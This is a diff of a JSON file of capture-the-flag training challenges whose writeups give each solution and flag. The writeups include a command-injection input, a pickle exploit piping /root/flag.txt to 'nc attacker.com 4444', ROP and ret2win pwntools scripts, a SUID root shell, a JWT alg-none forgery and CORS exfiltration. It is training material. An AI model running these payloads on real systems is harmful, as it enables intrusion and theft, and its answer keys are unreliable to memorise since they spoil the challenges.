+    "writeup": "1. Curl the robots file: `curl https://target/robots.txt`.\n2. Observe `Disallow: /dev-secret-internal/`.\n3. Request `curl https://target/dev-secret-internal/flag.txt`.\n4. Flag: `flag{r0b0ts_txt_d1r_tr4v3rs4l_f0und}`",
+    "track": "training"
   },
   {
     "id": "web-8",
@@ -1200,7 +1249,8 @@
     "concept": "Command Injection, Bash Metacharacters, RCE, OWASP Top 10",
     "cheatsheet": "curl -s -X POST -d \"payload\" target",
     "badge": "Medium Web Ex",
-    "writeup": "1. In the ping form input field, enter `127.0.0.1; cat /flag.txt`.\n2. The system executes `ping -c 1 127.0.0.1; cat /flag.txt`.\n3. Server returns ping response followed immediately by the flag contents.\n4. Flag: `flag{c0mm4nd_1nj3ct10n_p1ng_pwn3d}`"
+    "writeup": "1. In the ping form input field, enter `127.0.0.1; cat /flag.txt`.\n2. The system executes `ping -c 1 127.0.0.1; cat /flag.txt`.\n3. Server returns ping response followed immediately by the flag contents.\n4. Flag: `flag{c0mm4nd_1nj3ct10n_p1ng_pwn3d}`",
+    "track": "training"
   },
   {
     "id": "web-9",
@@ -1224,7 +1274,8 @@
     "concept": "Prototype Pollution, Node.js Internals, Gadget Chains, RCE",
     "cheatsheet": "curl -s -X POST -d \"payload\" target",
     "badge": "Hard Web Ex",
-    "writeup": "1. Identify the recursive merge endpoint `/api/settings`.\n2. Send payload: `{\"__proto__\": {\"env\": {\"EVIL\": \"x\"}, \"NODE_OPTIONS\": \"--inspect=0.0.0.0:9229\"}}` or inject a reverse shell via `child_process`.\n3. Trigger background worker execution to spawn subprocess.\n4. Capture the reverse shell flag.\n5. Flag: `flag{pr0t0typ3_p0llut10n_n0d3_rc3}`"
+    "writeup": "1. Identify the recursive merge endpoint `/api/settings`.\n2. Send payload: `{\"__proto__\": {\"env\": {\"EVIL\": \"x\"}, \"NODE_OPTIONS\": \"--inspect=0.0.0.0:9229\"}}` or inject a reverse shell via `child_process`.\n3. Trigger background worker execution to spawn subprocess.\n4. Capture the reverse shell flag.\n5. Flag: `flag{pr0t0typ3_p0llut10n_n0d3_rc3}`",
+    "track": "training"
   },
   {
     "id": "web-10",
@@ -1248,7 +1299,8 @@
     "concept": "Insecure Deserialization, Python Pickle, Reduce Gadget, Privilege Escalation",
     "cheatsheet": "curl -s -X POST -d \"payload\" target",
     "badge": "Hard Web Ex",
-    "writeup": "1. Write exploit script:\n   ```python\n   import pickle, base64, os\n   class Exploit:\n       def __reduce__(self):\n           return (os.system, ('cat /root/flag.txt | nc attacker.com 4444',))\n   payload = base64.b64encode(pickle.dumps(Exploit())).decode()\n   print(payload)\n   ```\n2. Replace the session cookie with `payload` and refresh.\n3. Netcat receives incoming shell connection with the flag.\n4. Flag: `flag{p1ckl3_d3s3r14l1z4t10n_rc3_pwn}`"
+    "writeup": "1. Write exploit script:\n   ```python\n   import pickle, base64, os\n   class Exploit:\n       def __reduce__(self):\n           return (os.system, ('cat /root/flag.txt | nc attacker.com 4444',))\n   payload = base64.b64encode(pickle.dumps(Exploit())).decode()\n   print(payload)\n   ```\n2. Replace the session cookie with `payload` and refresh.\n3. Netcat receives incoming shell connection with the flag.\n4. Flag: `flag{p1ckl3_d3s3r14l1z4t10n_rc3_pwn}`",
+    "track": "training"
   },
   {
     "id": "rev-7",
@@ -1272,7 +1324,8 @@
     "concept": "Python Bytecode, pycdc, Disassembly, Decompilation",
     "cheatsheet": "ghidra / gdb-pwndbg ./target",
     "badge": "Easy Revers",
-    "writeup": "1. Run `pycdc auth_check.pyc` or `uncompyle6 auth_check.pyc`.\n2. Decompiled Python source shows:\n   ```python\n   password = input('Enter key: ')\n   if password == 'flag{pyc_byt3c0d3_d3c0mp1l3d_34sy}':\n       print('Access Granted')\n   ```\n3. Flag: `flag{pyc_byt3c0d3_d3c0mp1l3d_34sy}`"
+    "writeup": "1. Run `pycdc auth_check.pyc` or `uncompyle6 auth_check.pyc`.\n2. Decompiled Python source shows:\n   ```python\n   password = input('Enter key: ')\n   if password == 'flag{pyc_byt3c0d3_d3c0mp1l3d_34sy}':\n       print('Access Granted')\n   ```\n3. Flag: `flag{pyc_byt3c0d3_d3c0mp1l3d_34sy}`",
+    "track": "training"
   },
   {
     "id": "rev-8",
@@ -1296,7 +1349,8 @@
     "concept": "Anti-Debugging, ptrace, GDB, Binary Patching, x86 Assembly",
     "cheatsheet": "ghidra / gdb-pwndbg ./target",
     "badge": "Medium Revers",
-    "writeup": "1. Open binary in Ghidra or GDB.\n2. Locate `call ptrace` at address 0x401150 followed by `test eax, eax; js exit`.\n3. In GDB: `catch syscall ptrace`, `run`, then `set $rax=0`, `continue`.\n4. Input registration key to generate valid flag verification output.\n5. Flag: `flag{ptr4c3_4nt1_d3bug_byp4ss3d}`"
+    "writeup": "1. Open binary in Ghidra or GDB.\n2. Locate `call ptrace` at address 0x401150 followed by `test eax, eax; js exit`.\n3. In GDB: `catch syscall ptrace`, `run`, then `set $rax=0`, `continue`.\n4. Input registration key to generate valid flag verification output.\n5. Flag: `flag{ptr4c3_4nt1_d3bug_byp4ss3d}`",
+    "track": "training"
   },
   {
     "id": "rev-9",
@@ -1320,7 +1374,8 @@
     "concept": "Angr, Symbolic Execution, SMT Solvers, Z3",
     "cheatsheet": "ghidra / gdb-pwndbg ./target",
     "badge": "Hard Revers",
-    "writeup": "1. Write Angr script:\n   ```python\n   import angr, claripy\n   proj = angr.Project('./matrix_hasher')\n   flag_chars = [claripy.BVS(f'c_{i}', 8) for i in range(32)]\n   flag = claripy.Concat(*flag_chars)\n   state = proj.factory.entry_state(stdin=flag)\n   simgr = proj.factory.simulation_manager(state)\n   simgr.explore(find=0x401500, avoid=0x401550)\n   found = simgr.found[0]\n   print(found.solver.eval(flag, cast_to=bytes))\n   ```\n2. Solver yields flag.\n3. Flag: `flag{4ngr_symb0l1c_smt_s0lv3d}`"
+    "writeup": "1. Write Angr script:\n   ```python\n   import angr, claripy\n   proj = angr.Project('./matrix_hasher')\n   flag_chars = [claripy.BVS(f'c_{i}', 8) for i in range(32)]\n   flag = claripy.Concat(*flag_chars)\n   state = proj.factory.entry_state(stdin=flag)\n   simgr = proj.factory.simulation_manager(state)\n   simgr.explore(find=0x401500, avoid=0x401550)\n   found = simgr.found[0]\n   print(found.solver.eval(flag, cast_to=bytes))\n   ```\n2. Solver yields flag.\n3. Flag: `flag{4ngr_symb0l1c_smt_s0lv3d}`",
+    "track": "training"
   },
   {
     "id": "rev-10",
@@ -1344,7 +1399,8 @@
     "concept": "VM Disassembly, Bytecode Reversing, Virtual Machine Architecture, Ghidra",
     "cheatsheet": "ghidra / gdb-pwndbg ./target",
     "badge": "Hard Revers",
-    "writeup": "1. Reverse the opcode handlers in Ghidra to map each opcode byte to its semantic operation.\n2. Dump bytecode section from binary `.data`.\n3. Write a Python disassembler that parses instructions and prints human-readable assembly.\n4. Analyze the bytecode algorithm: it performs RC4 key scheduling and XOR with hardcoded key.\n5. Decrypt target memory array to retrieve flag.\n6. Flag: `flag{cust0m_vm_byt3c0d3_d1s4ss3mbl3d}`"
+    "writeup": "1. Reverse the opcode handlers in Ghidra to map each opcode byte to its semantic operation.\n2. Dump bytecode section from binary `.data`.\n3. Write a Python disassembler that parses instructions and prints human-readable assembly.\n4. Analyze the bytecode algorithm: it performs RC4 key scheduling and XOR with hardcoded key.\n5. Decrypt target memory array to retrieve flag.\n6. Flag: `flag{cust0m_vm_byt3c0d3_d1s4ss3mbl3d}`",
+    "track": "training"
   },
   {
     "id": "misc-7",
@@ -1368,7 +1424,8 @@
     "concept": "Linux Privilege Escalation, SUID, GTFOBins, Capabilities",
     "cheatsheet": "checksec --file=./target",
     "badge": "Easy Misc/O",
-    "writeup": "1. Execute `find / -perm -4000 2>/dev/null`.\n2. Notice `/usr/bin/find` has SUID permission.\n3. Run GTFOBins exploit: `/usr/bin/find . -exec /bin/sh -p \\; -quit`.\n4. Shell prompt changes to `#` (root).\n5. Read `/root/flag.txt`.\n6. Flag: `flag{su1d_gtf0b1ns_r00t_pr1v3sc}`"
+    "writeup": "1. Execute `find / -perm -4000 2>/dev/null`.\n2. Notice `/usr/bin/find` has SUID permission.\n3. Run GTFOBins exploit: `/usr/bin/find . -exec /bin/sh -p \\; -quit`.\n4. Shell prompt changes to `#` (root).\n5. Read `/root/flag.txt`.\n6. Flag: `flag{su1d_gtf0b1ns_r00t_pr1v3sc}`",
+    "track": "training"
   },
   {
     "id": "misc-8",
@@ -1392,7 +1449,8 @@
     "concept": "Buffer Overflow, Ret2Win, pwntools, x86-64 Stack Frame",
     "cheatsheet": "checksec --file=./target",
     "badge": "Medium Misc/O",
-    "writeup": "1. In GDB: `pattern create 64` and `pattern search` after segfault to determine offset is exactly 40 bytes.\n2. Obtain `win` function address in GDB: `print win` -> `0x401176`.\n3. In 64-bit systems, add a `ret` gadget for 16-byte stack alignment if crash occurs in `system` (MOVAPS issue).\n4. Exploit script:\n   ```python\n   from pwn import *\n   p = process('./vuln')\n   ret = 0x40101a\n   win = 0x401176\n   payload = b'A'*40 + p64(ret) + p64(win)\n   p.sendline(payload)\n   print(p.recvall())\n   ```\n5. Flag: `flag{r3t2w1n_st4ck_b0f_c0ntr0l}`"
+    "writeup": "1. In GDB: `pattern create 64` and `pattern search` after segfault to determine offset is exactly 40 bytes.\n2. Obtain `win` function address in GDB: `print win` -> `0x401176`.\n3. In 64-bit systems, add a `ret` gadget for 16-byte stack alignment if crash occurs in `system` (MOVAPS issue).\n4. Exploit script:\n   ```python\n   from pwn import *\n   p = process('./vuln')\n   ret = 0x40101a\n   win = 0x401176\n   payload = b'A'*40 + p64(ret) + p64(win)\n   p.sendline(payload)\n   print(p.recvall())\n   ```\n5. Flag: `flag{r3t2w1n_st4ck_b0f_c0ntr0l}`",
+    "track": "training"
   },
   {
     "id": "misc-9",
@@ -1416,7 +1474,8 @@
     "concept": "ROP, Ret2Libc, GOT Overwrite, ASLR Bypass, pwntools",
     "cheatsheet": "checksec --file=./target",
     "badge": "Hard Misc/O",
-    "writeup": "1. Find gadgets with ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`.\n2. Stage 1 payload:\n   `payload1 = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`.\n3. Parse leak and calculate libc base.\n4. Stage 2 payload:\n   `payload2 = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)`.\n5. Interactive shell opened; cat flag.\n6. Flag: `flag{r3t2l1bc_r0p_ch41n_nx_byp4ss}`"
+    "writeup": "1. Find gadgets with ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`.\n2. Stage 1 payload:\n   `payload1 = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`.\n3. Parse leak and calculate libc base.\n4. Stage 2 payload:\n   `payload2 = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)`.\n5. Interactive shell opened; cat flag.\n6. Flag: `flag{r3t2l1bc_r0p_ch41n_nx_byp4ss}`",
+    "track": "training"
   },
   {
     "id": "misc-10",
@@ -1440,7 +1499,8 @@
     "concept": "Heap Exploitation, Tcache Poisoning, Safe Linking, glibc 2.35",
     "cheatsheet": "checksec --file=./target",
     "badge": "Hard Misc/O",
-    "writeup": "1. Free a chunk and leak the mangled pointer to compute heap base address: `heap_base = (leak << 12)`.\n2. Poison forward pointer with `target_addr ^ (chunk_addr >> 12)`.\n3. Allocate twice to get an arbitrary write primitive at target.\n4. Overwrite return address on stack with one_gadget.\n5. Flag: `flag{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}`"
+    "writeup": "1. Free a chunk and leak the mangled pointer to compute heap base address: `heap_base = (leak << 12)`.\n2. Poison forward pointer with `target_addr ^ (chunk_addr >> 12)`.\n3. Allocate twice to get an arbitrary write primitive at target.\n4. Overwrite return address on stack with one_gadget.\n5. Flag: `flag{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}`",
+    "track": "training"
   },
   {
     "id": "crypto-11",
@@ -1464,7 +1524,8 @@
     "concept": "Transposition Ciphers, Rail Fence, Geometric Permutation",
     "cheatsheet": "python3 -c \"import sys; # use CyberChef Rail Fence Decode\"",
     "badge": "Rail Master",
-    "writeup": "1. Put the ciphertext into CyberChef.\n2. Add 'Rail Fence Cipher Decode' recipe with Rails = 3, Offset = 0.\n3. The decrypted message appears directly.\n4. Flag: `flag{rail_f3nc3_z1gz4g_unf0ld3d}`"
+    "writeup": "1. Put the ciphertext into CyberChef.\n2. Add 'Rail Fence Cipher Decode' recipe with Rails = 3, Offset = 0.\n3. The decrypted message appears directly.\n4. Flag: `flag{rail_f3nc3_z1gz4g_unf0ld3d}`",
+    "track": "training"
   },
   {
     "id": "crypto-12",
@@ -1488,7 +1549,8 @@
     "concept": "Polybius Square, Coordinate Ciphers, Tap Code",
     "cheatsheet": "CyberChef -> 'Polybius Square Decode'",
     "badge": "Grid Decoder",
-    "writeup": "1. Convert coordinate pairs using the 5x5 Polybius grid.\n2. Coordinates map out the plaintext characters.\n3. Flag: `flag{p0lyb1us_t4p_c0d3_d3c0d3d}`"
+    "writeup": "1. Convert coordinate pairs using the 5x5 Polybius grid.\n2. Coordinates map out the plaintext characters.\n3. Flag: `flag{p0lyb1us_t4p_c0d3_d3c0d3d}`",
+    "track": "training"
   },
   {
     "id": "crypto-13",
@@ -1512,7 +1574,8 @@
     "concept": "Beaufort Cipher, Polyalphabetic Substitution, Key Modulo",
     "cheatsheet": "CyberChef -> 'Vigen\u00e8re Decode' with variant Beaufort",
     "badge": "Naval Cryptor",
-    "writeup": "1. In CyberChef, add 'Beaufort Cipher Decode' with key 'NAVAL'.\n2. The reciprocal subtraction reveals the plaintext and flag.\n3. Flag: `flag{b34uf0rt_r3c1pr0c4l_v1g3n3r3}`"
+    "writeup": "1. In CyberChef, add 'Beaufort Cipher Decode' with key 'NAVAL'.\n2. The reciprocal subtraction reveals the plaintext and flag.\n3. Flag: `flag{b34uf0rt_r3c1pr0c4l_v1g3n3r3}`",
+    "track": "training"
   },
   {
     "id": "crypto-14",
@@ -1536,7 +1599,8 @@
     "concept": "Solitaire Cipher, Pseudo-Random Generation, Manual Cryptography",
     "cheatsheet": "python3 -c \"import solitaire; print(...)\"",
     "badge": "Card Shark",
-    "writeup": "1. Implement Schneier's deck permutation algorithm in Python.\n2. Generate keystream integers $K_i$ and subtract from ciphertext letters modulo 26.\n3. Flag: `flag{s0l1t41r3_c4rd_d3ck_k3ystr34m}`"
+    "writeup": "1. Implement Schneier's deck permutation algorithm in Python.\n2. Generate keystream integers $K_i$ and subtract from ciphertext letters modulo 26.\n3. Flag: `flag{s0l1t41r3_c4rd_d3ck_k3ystr34m}`",
+    "track": "training"
   },
   {
     "id": "crypto-15",
@@ -1560,7 +1624,8 @@
     "concept": "RSA Cryptanalysis, Wiener Attack, Continued Fractions, SageMath",
     "cheatsheet": "python3 -m owiener -e <e> -n <n>",
     "badge": "Wiener Cracker",
-    "writeup": "1. Install `owiener` (`pip install owiener`).\n2. Run `d = owiener.attack(e, N)`.\n3. Decrypt ciphertext: `m = pow(c, d, N)` and convert to ASCII.\n4. Flag: `flag{w13n3r_c0nt1nu3d_fr4ct10n_d_sm4ll}`"
+    "writeup": "1. Install `owiener` (`pip install owiener`).\n2. Run `d = owiener.attack(e, N)`.\n3. Decrypt ciphertext: `m = pow(c, d, N)` and convert to ASCII.\n4. Flag: `flag{w13n3r_c0nt1nu3d_fr4ct10n_d_sm4ll}`",
+    "track": "training"
   },
   {
     "id": "crypto-16",
@@ -1584,7 +1649,8 @@
     "concept": "RSA Polynomial Rings, Franklin-Reiter, GCD in Z/NZ, SageMath",
     "cheatsheet": "sage -c 'P.<x> = PolynomialRing(Zmod(N)); ...'",
     "badge": "Ring Theorist",
-    "writeup": "1. In SageMath: define polynomial ring over integers modulo $N$.\n2. Compute monic polynomial GCD of $x^3 - c_1$ and $(a x + b)^3 - c_2$.\n3. The linear remainder gives $-m_1$, revealing the message.\n4. Flag: `flag{fr4nkl1n_r31t3r_p0lyn0m14l_gcd}`"
+    "writeup": "1. In SageMath: define polynomial ring over integers modulo $N$.\n2. Compute monic polynomial GCD of $x^3 - c_1$ and $(a x + b)^3 - c_2$.\n3. The linear remainder gives $-m_1$, revealing the message.\n4. Flag: `flag{fr4nkl1n_r31t3r_p0lyn0m14l_gcd}`",
+    "track": "training"
   },
   {
     "id": "crypto-17",
@@ -1608,7 +1674,8 @@
     "concept": "Lattice Cryptanalysis, Merkle-Hellman Knapsack, LLL Algorithm, Shortest Vector Problem",
     "cheatsheet": "sage -c 'M = Matrix(...); M.LLL()'",
     "badge": "Lattice Architect",
-    "writeup": "1. Build the basis matrix in SageMath.\n2. Apply `.LLL()` to find the shortest lattice vector.\n3. Check coordinates for $\\pm 1/2$ or $0/1$ assignments to reconstruct $m$.\n4. Flag: `flag{m3rkl3_h3llm4n_lll_l4tt1c3_r3duc3d}`"
+    "writeup": "1. Build the basis matrix in SageMath.\n2. Apply `.LLL()` to find the shortest lattice vector.\n3. Check coordinates for $\\pm 1/2$ or $0/1$ assignments to reconstruct $m$.\n4. Flag: `flag{m3rkl3_h3llm4n_lll_l4tt1c3_r3duc3d}`",
+    "track": "training"
   },
   {
     "id": "forensics-11",
@@ -1632,7 +1699,8 @@
     "concept": "Linux Artifacts, Bash History, Dotfiles, Command Audit",
     "cheatsheet": "cat ~/.bash_history | grep -E 'export|flag|key'",
     "badge": "Shell Auditor",
-    "writeup": "1. Inspect `.bash_history` and `.bash_logout`.\n2. Recover uncommitted export string: `export SECRET_TOKEN=flag{b4sh_h1st0ry_d0tf1l3s_4ud1t}`.\n3. Flag: `flag{b4sh_h1st0ry_d0tf1l3s_4ud1t}`"
+    "writeup": "1. Inspect `.bash_history` and `.bash_logout`.\n2. Recover uncommitted export string: `export SECRET_TOKEN=flag{b4sh_h1st0ry_d0tf1l3s_4ud1t}`.\n3. Flag: `flag{b4sh_h1st0ry_d0tf1l3s_4ud1t}`",
+    "track": "training"
   },
   {
     "id": "forensics-12",
@@ -1656,7 +1724,8 @@
     "concept": "Browser Forensics, SQLite Database, Chromium Artifacts",
     "cheatsheet": "sqlite3 History \"SELECT url FROM urls WHERE url LIKE '%flag%';\"",
     "badge": "Web Tracker",
-    "writeup": "1. Open `History` in `sqlite3` or DB Browser for SQLite.\n2. Query URLs table: `SELECT url FROM urls WHERE url LIKE '%flag%';`.\n3. URL contains parameter `?token=flag{chr0m1um_sql1t3_h1st0ry_3xtr4ct}`.\n4. Flag: `flag{chr0m1um_sql1t3_h1st0ry_3xtr4ct}`"
+    "writeup": "1. Open `History` in `sqlite3` or DB Browser for SQLite.\n2. Query URLs table: `SELECT url FROM urls WHERE url LIKE '%flag%';`.\n3. URL contains parameter `?token=flag{chr0m1um_sql1t3_h1st0ry_3xtr4ct}`.\n4. Flag: `flag{chr0m1um_sql1t3_h1st0ry_3xtr4ct}`",
+    "track": "training"
   },
   {
     "id": "forensics-13",
@@ -1680,7 +1749,8 @@
     "concept": "Windows Event Logs, EVTX Forensics, Script Block Logging, Event ID 4104",
     "cheatsheet": "chainsaw hunt -s evtx_dir/ --mapping rules.yml",
     "badge": "Log Hunter",
-    "writeup": "1. Extract Event ID 4104 script block text using `python-evtx`.\n2. Reconstruct chunks from the multi-stage logging.\n3. The script block reveals: `$flag = 'flag{3vtx_p0w3rsh3ll_scr1ptbl0ck_4104}'`.\n4. Flag: `flag{3vtx_p0w3rsh3ll_scr1ptbl0ck_4104}`"
+    "writeup": "1. Extract Event ID 4104 script block text using `python-evtx`.\n2. Reconstruct chunks from the multi-stage logging.\n3. The script block reveals: `$flag = 'flag{3vtx_p0w3rsh3ll_scr1ptbl0ck_4104}'`.\n4. Flag: `flag{3vtx_p0w3rsh3ll_scr1ptbl0ck_4104}`",
+    "track": "training"
   },
   {
     "id": "forensics-14",
@@ -1704,7 +1774,8 @@
     "concept": "MBR Partition Table, Sector 0 Forensics, VBR Reconstruction, Hex Editing",
     "cheatsheet": "testdisk /dev/loop0 OR xxd drive.raw | head -n 35",
     "badge": "Disk Surgeon",
-    "writeup": "1. Run `testdisk` or manually edit sector 0 with `hexedit`.\n2. Set byte 446: Bootable flag (0x80), Partition type (0x07 for NTFS), Start LBA (2048 = `00 08 00 00` little endian).\n3. Mount loop device: `losetup -P /dev/loop0 drive.raw`.\n4. Read `flag.txt` from mounted partition.\n5. Flag: `flag{mbr_p4rt1t10n_t4bl3_r3c0v3r3d}`"
+    "writeup": "1. Run `testdisk` or manually edit sector 0 with `hexedit`.\n2. Set byte 446: Bootable flag (0x80), Partition type (0x07 for NTFS), Start LBA (2048 = `00 08 00 00` little endian).\n3. Mount loop device: `losetup -P /dev/loop0 drive.raw`.\n4. Read `flag.txt` from mounted partition.\n5. Flag: `flag{mbr_p4rt1t10n_t4bl3_r3c0v3r3d}`",
+    "track": "training"
   },
   {
     "id": "forensics-15",
@@ -1728,7 +1799,8 @@
     "concept": "Windows Registry, SAM Database, SysKey, Impacket Secretsdump",
     "cheatsheet": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL",
     "badge": "Hive Harvester",
-    "writeup": "1. Execute `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`.\n2. Observe extracted user accounts.\n3. The Administrator password description field contains the flag.\n4. Flag: `flag{s4m_syst3m_h1v3_s3cr3tsdmp_pwn}`"
+    "writeup": "1. Execute `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`.\n2. Observe extracted user accounts.\n3. The Administrator password description field contains the flag.\n4. Flag: `flag{s4m_syst3m_h1v3_s3cr3tsdmp_pwn}`",
+    "track": "training"
   },
   {
     "id": "forensics-16",
@@ -1752,7 +1824,8 @@
     "concept": "Shimcache Forensics, Amcache.hve, Program Execution Artifacts, Timeline Analysis",
     "cheatsheet": "python3 ShimCacheParser.py -i SYSTEM -o out.csv",
     "badge": "Cache Investigator",
-    "writeup": "1. Run `ShimCacheParser.py -i SYSTEM -o output.csv`.\n2. Search CSV for executables running from removable drives (`E:\\malware.exe`).\n3. Correlate with `Amcache.hve` to verify SHA-1 hash and flag string.\n4. Flag: `flag{sh1mc4ch3_4mc4ch3_3x3cut10n_pr0v3d}`"
+    "writeup": "1. Run `ShimCacheParser.py -i SYSTEM -o output.csv`.\n2. Search CSV for executables running from removable drives (`E:\\malware.exe`).\n3. Correlate with `Amcache.hve` to verify SHA-1 hash and flag string.\n4. Flag: `flag{sh1mc4ch3_4mc4ch3_3x3cut10n_pr0v3d}`",
+    "track": "training"
   },
   {
     "id": "forensics-17",
@@ -1776,7 +1849,8 @@
     "concept": "Kernel Crash Dump, Volatility 3 Linux, LKM Rootkits, Syscall Hooking",
     "cheatsheet": "vol -f vmcore linux.check_syscall.Check_syscall",
     "badge": "Kernel Detective",
-    "writeup": "1. Run `vol -f vmcore linux.check_syscall`.\n2. Entry `sys_kill` (syscall 62) points to anomalous unlinked module address.\n3. Disassemble the hook function to find the authorization token.\n4. Flag: `flag{lkm_r00tk1t_hook3d_sysc4ll_t4bl3}`"
+    "writeup": "1. Run `vol -f vmcore linux.check_syscall`.\n2. Entry `sys_kill` (syscall 62) points to anomalous unlinked module address.\n3. Disassemble the hook function to find the authorization token.\n4. Flag: `flag{lkm_r00tk1t_hook3d_sysc4ll_t4bl3}`",
+    "track": "training"
   },
   {
     "id": "stego-11",
@@ -1800,7 +1874,8 @@
     "concept": "Audio Phase Inversion, Audacity, Channel Subtraction, Stereo Forensics",
     "cheatsheet": "ffmpeg -i track.mp3 -af 'pan=mono|c0=0.5*c0-0.5*c1' out.wav",
     "badge": "Acoustic Filter",
-    "writeup": "1. Load `track.mp3` into Audacity.\n2. Invert Channel R and merge with Channel L to mono.\n3. The static cancels out completely, revealing clear spoken voice speaking the flag.\n4. Flag: `flag{aud10_ph4s3_1nv3rs10n_c4nc3l}`"
+    "writeup": "1. Load `track.mp3` into Audacity.\n2. Invert Channel R and merge with Channel L to mono.\n3. The static cancels out completely, revealing clear spoken voice speaking the flag.\n4. Flag: `flag{aud10_ph4s3_1nv3rs10n_c4nc3l}`",
+    "track": "training"
   },
   {
     "id": "stego-12",
@@ -1824,7 +1899,8 @@
     "concept": "BMP Image Format, Scanline Padding, Pixel Array Alignment",
     "cheatsheet": "python3 -c \"# extract row padding bytes\"",
     "badge": "Pixel Aligner",
-    "writeup": "1. Parse BMP header: get width, height, and data offset.\n2. Calculate row padding: `pad = (4 - (width * 3) % 4) % 4`.\n3. Read the `pad` bytes after every scanline to extract the hidden string.\n4. Flag: `flag{bmp_p4dd1ng_byt3s_unp4ck3d}`"
+    "writeup": "1. Parse BMP header: get width, height, and data offset.\n2. Calculate row padding: `pad = (4 - (width * 3) % 4) % 4`.\n3. Read the `pad` bytes after every scanline to extract the hidden string.\n4. Flag: `flag{bmp_p4dd1ng_byt3s_unp4ck3d}`",
+    "track": "training"
   },
   {
     "id": "stego-13",
@@ -1848,7 +1924,8 @@
     "concept": "PDF Object Streams, FlateDecode, qpdf, Didier Stevens PDF Tools",
     "cheatsheet": "qpdf --qdf memo.pdf decompressed.pdf && grep -a flag decompressed.pdf",
     "badge": "PDF Inspector",
-    "writeup": "1. Decompress PDF streams: `qpdf --qdf --object-streams=disable memo.pdf raw.pdf`.\n2. Grep raw text: `grep -i 'flag{' raw.pdf`.\n3. Flag: `flag{pdf_fl4t3_str34m_4nn0t4t10n}`"
+    "writeup": "1. Decompress PDF streams: `qpdf --qdf --object-streams=disable memo.pdf raw.pdf`.\n2. Grep raw text: `grep -i 'flag{' raw.pdf`.\n3. Flag: `flag{pdf_fl4t3_str34m_4nn0t4t10n}`",
+    "track": "training"
   },
   {
     "id": "stego-14",
@@ -1872,7 +1949,8 @@
     "concept": "Tar Block Structure, Slack Space Steganography, Byte Alignment",
     "cheatsheet": "xxd archive.tar | grep -v '0000 0000'",
     "badge": "Slack Hunter",
-    "writeup": "1. Parse tar headers and calculate file sizes.\n2. Read bytes between `offset + filesize` and `ceil(filesize / 512) * 512`.\n3. The non-zero slack bytes assemble into the flag.\n4. Flag: `flag{t4r_bl0ck_sl4ck_sp4c3_c4rv3d}`"
+    "writeup": "1. Parse tar headers and calculate file sizes.\n2. Read bytes between `offset + filesize` and `ceil(filesize / 512) * 512`.\n3. The non-zero slack bytes assemble into the flag.\n4. Flag: `flag{t4r_bl0ck_sl4ck_sp4c3_c4rv3d}`",
+    "track": "training"
   },
   {
     "id": "stego-15",
@@ -1896,7 +1974,8 @@
     "concept": "Video Codecs, I-Frame Extraction, GOP Structure, FFmpeg",
     "cheatsheet": "ffprobe -show_frames -select_streams v video.mp4 | grep pict_type",
     "badge": "Video Frame Crafter",
-    "writeup": "1. Dump I-frames with FFmpeg.\n2. Diff first and second I-frame in Python to isolate injected pixels.\n3. Flag: `flag{mp4_1fr4m3_g0p_qu4nt1z4t10n}`"
+    "writeup": "1. Dump I-frames with FFmpeg.\n2. Diff first and second I-frame in Python to isolate injected pixels.\n3. Flag: `flag{mp4_1fr4m3_g0p_qu4nt1z4t10n}`",
+    "track": "training"
   },
   {
     "id": "stego-16",
@@ -1920,7 +1999,8 @@
     "concept": "DSSS Audio Stego, LFSR Chipping Sequences, Cross-Correlation, SciPy",
     "cheatsheet": "python3 -c \"import scipy.signal; ...\"",
     "badge": "Signal Specialist",
-    "writeup": "1. Load audio in Python using `scipy.io.wavfile`.\n2. Generate LFSR chipping sequence and multiply with windowed FFT bins.\n3. Peak correlation indices decode the bitstream.\n4. Flag: `flag{dsss_spr34d_sp3ctrum_d3spr34d}`"
+    "writeup": "1. Load audio in Python using `scipy.io.wavfile`.\n2. Generate LFSR chipping sequence and multiply with windowed FFT bins.\n3. Peak correlation indices decode the bitstream.\n4. Flag: `flag{dsss_spr34d_sp3ctrum_d3spr34d}`",
+    "track": "training"
   },
   {
     "id": "web-11",
@@ -1944,7 +2024,8 @@
     "concept": "JSON Web Tokens, Alg None Vulnerability, Authentication Bypass",
     "cheatsheet": "jwt_tool <token> -X a",
     "badge": "Token Forger",
-    "writeup": "1. Decode JWT header: change `{\"alg\":\"HS256\"}` to `{\"alg\":\"none\"}`.\n2. Decode JWT payload: change `\"role\":\"user\"` to `\"role\":\"admin\"`.\n3. Base64url encode both and append trailing dot: `eyJhbGciOiJub25lIn0.ey...`.\n4. Submit as Cookie to `/dashboard` to capture flag.\n5. Flag: `flag{jwt_n0n3_4lg0r1thm_byp4ss}`"
+    "writeup": "1. Decode JWT header: change `{\"alg\":\"HS256\"}` to `{\"alg\":\"none\"}`.\n2. Decode JWT payload: change `\"role\":\"user\"` to `\"role\":\"admin\"`.\n3. Base64url encode both and append trailing dot: `eyJhbGciOiJub25lIn0.ey...`.\n4. Submit as Cookie to `/dashboard` to capture flag.\n5. Flag: `flag{jwt_n0n3_4lg0r1thm_byp4ss}`",
+    "track": "training"
   },
   {
     "id": "web-12",
@@ -1968,7 +2049,8 @@
     "concept": "CORS Misconfiguration, Credentialed Cross-Origin Requests, Web Security",
     "cheatsheet": "curl -H 'Origin: https://attacker.com' -I https://target/api",
     "badge": "Origin Breaker",
-    "writeup": "1. Verify reflected CORS origin and credentials headers.\n2. Deploy exploit page with `fetch('/api/account/secret', {credentials: 'include'})`.\n3. Exfiltrate JSON response containing the flag.\n4. Flag: `flag{c0rs_cr3d3nt14ls_0r1g1n_l34k}`"
+    "writeup": "1. Verify reflected CORS origin and credentials headers.\n2. Deploy exploit page with `fetch('/api/account/secret', {credentials: 'include'})`.\n3. Exfiltrate JSON response containing the flag.\n4. Flag: `flag{c0rs_cr3d3nt14ls_0r1g1n_l34k}`",
+    "track": "training"
   },
   {
     "id": "web-13",
@@ -1992,7 +2074,8 @@
     "concept": "XXE Injection, XML DTD, Local File Inclusion, OWASP Top 10",
